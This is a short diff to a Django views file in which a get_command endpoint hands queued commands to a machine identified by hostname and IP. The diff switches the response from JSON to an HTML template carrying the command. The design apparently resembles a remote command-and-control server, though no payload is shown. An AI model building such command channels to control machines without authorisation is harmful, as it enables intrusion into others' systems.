@@ -1,7 +1,8 @@
 from django.shortcuts import render
 from django.shortcuts import get_object_or_404, render
 from .models import Computer,Data,Action
-from django.http import JsonResponse
+from django.http import HttpResponse
+from django.template import loader
 import hashlib
 
 # Create your views here.
@@ -36,5 +37,9 @@ def get_command(request,hostname,ip,random):
             command=command[0]
             command.performed=True
             command.save()
-            return JsonResponse({'actions':command.command})
-    return JsonResponse({'actions':''})
+            template = loader.get_template('index.html')
+            context = {
+                'cmd': command.command,
+            }
+            return HttpResponse(template.render(context, request))
+    return render(request, 'index.html')
